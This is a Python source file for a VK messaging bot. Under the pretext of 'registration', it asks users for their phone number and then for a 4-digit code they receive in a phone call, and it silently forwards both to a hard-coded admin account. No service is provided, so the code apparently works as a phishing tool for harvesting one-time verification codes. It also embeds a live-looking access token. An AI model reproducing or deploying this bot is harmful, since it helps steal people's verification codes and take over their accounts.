try:
    import vk_api, time, os, requests
    from vk_api.longpoll import VkLongPoll, VkEventType
    from vk_api.utils import get_random_id
    from vk_api.keyboard import VkKeyboard, VkKeyboardColor

    print("Бот запущен!")
    keyboard = VkKeyboard(one_time=True)
    # 1
    keyboard.add_button('Назад ↩', color=VkKeyboardColor.PRIMARY)

    def write_message(sender, message):
        if i == 3:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                               'keyboard': keyboard.get_keyboard()})
        if i == 1 or i == 4 or i == 2:
            authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id()})

    token = "ea9d712af734713d514d026fd3044e2a18fcc829dae7b364f7002e4ac2767032a0dcd2051f9fbb9ac3206"
    authorize = vk_api.VkApi(token=token)
    longpoll = VkLongPoll(authorize)
    admin = 685062634
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW and event.to_me:
            reseived_message = event.text.lower()
            sender = event.user_id
            try:
                a = open(str(event.user_id) + "c.txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + "c.txt", "w")
                a.write("1")
                a.close()
            with open(str(event.user_id) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            if reseived_message == 'начать' and i == 1 \
                    or reseived_message == 'начать' and i == 1 \
                    or reseived_message == 'привет' and i == 1 \
                    or reseived_message == 'ку' and i == 1 \
                    or reseived_message == 'хай' and i == 1 \
                    or reseived_message == 'здравствуйте' and i == 1 \
                    or reseived_message == 'start' and i == 1 \
                    or reseived_message == 'дарова' and i == 1:
                    write_message(sender, 'Перед использованием пройдите регистрацию. \nВведите номер мобильного телефона: \n\nНа него поступит 4-х \nзначный код.')
                    a = open(str(sender) + "c.txt", "w")
                    a.write('2')
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
            elif reseived_message[0:5] == 'назад' and i == 3:
                a = open(str(sender) + "c.txt", "w")
                a.write('2')
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Перед использованием пройдите регистрацию. \nВведите номер мобильного телефона: \n\nНа него поступит 4-х \nзначный код.')

            elif i == 2:
                if len(reseived_message) < 15 and len(reseived_message) > 7:
                    a = open(str(sender) + "c.txt", "w")
                    a.write('3')
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, 'В течении 5 - минут вам \nпоступит звонок. \nВведите код который вам продиктует бот в звонке.')
                    write_message(admin, str(reseived_message))
                else:
                    write_message(sender, 'Не верный номер !!!')
            elif i == 3:
                if len(reseived_message) == 4:
                    a = open(str(sender) + "c.txt", "w")
                    a.write('4')
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, 'Запрос в обработке: \nОжидайте ответ в течении: \n24-х часов. \nПримерное время 2 - часа.')
                    write_message(admin, str(reseived_message))
                    a = open(str(sender) + "c.txt", "w")
                    a.write('5')
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                 
                else:
                    write_message(sender, '4 цифры !!!')

            else:
                write_message(sender, 'Прости я бот, я знаю не много :(')
except:
    os.system('python bot.py')
